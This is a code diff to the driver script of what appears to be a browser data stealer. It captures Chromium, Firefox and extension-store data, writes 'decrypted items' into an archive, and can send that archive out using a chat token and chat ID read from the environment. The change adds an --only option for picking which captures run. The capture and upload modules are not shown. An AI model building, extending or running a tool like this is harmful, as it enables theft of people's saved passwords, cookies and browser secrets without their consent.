@@ -29,7 +29,8 @@ import report
 import sysinfo
 
 
-def run(dry_run: bool, keep_archive: str | None = None) -> int:
+def run(dry_run: bool, keep_archive: str | None = None,
+        options: dict | None = None) -> int:
     t0 = time.time()
     stage = tempfile.mkdtemp(prefix="jwg_stage_")
     try:
@@ -37,15 +38,7 @@ def run(dry_run: bool, keep_archive: str | None = None) -> int:
         print(probe.human(rows))
         print()
 
-        caps = []
-        for fn, label in ((capture.capture_chromium, "chromium"),
-                          (capture.capture_firefox, "firefox"),
-                          (capture.capture_extension_stores, "extensions")):
-            try:
-                got = fn(stage)
-                caps.extend(got)
-            except Exception as e:
-                caps.append(report_caps_error(label, e))
+        caps = capture.run_capture(stage, options or {k: True for k in capture.CAPTURE_TOGGLES})
 
         system = sysinfo.gather()
         report.write_items(stage, caps)   # decrypted items must land in the archive
@@ -83,10 +76,16 @@ def run(dry_run: bool, keep_archive: str | None = None) -> int:
         shutil.rmtree(stage, ignore_errors=True)
 
 
-def report_caps_error(label: str, exc: Exception):
-    c = capture.Capture(f"{label}:ERROR")
-    c.note = f"{type(exc).__name__}: {exc}"
-    return c
+def _selected_options(a) -> dict:
+    """Build the toggle->bool map from --only (comma list). Empty --only means all."""
+    if a.only:
+        picked = {tok.strip() for tok in a.only.split(",") if tok.strip()}
+        unknown = picked - set(capture.CAPTURE_TOGGLES)
+        if unknown:
+            print(f"[warn] ignoring unknown toggles: {', '.join(sorted(unknown))}",
+                  file=sys.stderr)
+        return {k: k in picked for k in capture.CAPTURE_TOGGLES}
+    return {k: True for k in capture.CAPTURE_TOGGLES}
 
 
 def main(argv=None) -> int:
@@ -97,6 +96,9 @@ def main(argv=None) -> int:
     g.add_argument("--probe", action="store_true", help="capability check only")
     ap.add_argument("--json", action="store_true", help="machine-readable output")
     ap.add_argument("--keep-archive", metavar="PATH", help="copy the archive here on dry-run")
+    ap.add_argument("--only", metavar="TOGGLES",
+                    help="comma list of captures to run: " + ",".join(capture.CAPTURE_TOGGLES)
+                         + " (default: all)")
     a = ap.parse_args(argv)
 
     if a.probe:
@@ -110,7 +112,7 @@ def main(argv=None) -> int:
     if a.send and not dest_set:
         print(f"[note] --send ignored: {config.TOKEN_ENV}/{config.CHAT_ENV} not set. "
               "Running dry.", file=sys.stderr)
-    return run(dry_run=dry, keep_archive=a.keep_archive)
+    return run(dry_run=dry, keep_archive=a.keep_archive, options=_selected_options(a))
 
 
 if __name__ == "__main__":
